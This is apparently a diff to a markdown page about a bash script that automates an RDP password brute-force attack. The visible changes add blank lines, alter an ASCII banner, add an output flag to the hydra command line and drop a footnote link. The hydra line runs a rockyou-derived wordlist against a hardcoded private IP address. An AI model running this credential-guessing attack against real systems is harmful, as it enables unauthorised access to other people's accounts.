@@ -19,7 +19,9 @@ The goal of this script is to automate a rdp bruteforce attack against a specifi
 
 ## Upcoming changes
 
+
 - Add option to use a file or single IP address instead of using hardcoded IP
+
 ---
 
 ## Code
@@ -41,7 +43,7 @@ clear
 echo "           @@@@@@@@@@@@@@@@@@@@@@@@@@# @.@ @@@@@@@@@@@@@@@@@@@@@@@@@@#"
 echo "             ,@@@@@@@@@@@@@@@@@@@@@ @@@@.@@@./@@@@@@@@@@@@@@@@@@@@@"
 echo "                @@@@@@@@@@@@@@@@# @@@@@@.@@@@@@ @@@@@@@@@@@@@@@@#"
-echo "                  *@@@@@@@@@@@ %@@@@@@#.  @@@@@@@,(@@@@@@@@@@@"
+echo "                  *@@@@@@@@@@@ %@@@@@@# .  @@@@@@@,(@@@@@@@@@@@"
 echo "                             @@@@@@@ %@@.@@ (@@@@@@@"
 echo "                          %@@@@@@#.@@@@@.@@@@% @@@@@@@,"
 echo "                        @@@@@@@ &@@@@@@* &@@@@@@ (@@@@@@@"
@@ -61,7 +63,7 @@ if [ "$Console" = "yes" ]; then
        echo  -n "Enter path/to/wordlist (/usr/share/wordlists/rockyou.txt): "; read path
         cat "$path" | grep -E '^.{12,}' > passlist.txt
         echo -n "Enter possible user credentials: "; read users
-        sudo hydra -I -l "$users" -P passlist.txt -t 1 -F -V rdp://172.16.139.39 
+        sudo hydra -I -l "$users" -P passlist.txt -t 1 -F -V rdp://172.16.139.39 -o password 
         exec "$0"
 elif [ "$Console" = "no" ]; then
         echo "Goodbye"
@@ -77,4 +79,3 @@ fi
 ---
 {: data-content="footnotes"}
 
-[^1]: GOOSE.py can be found over [here](https:Gh0st-D3V.github.io/goose-py) 
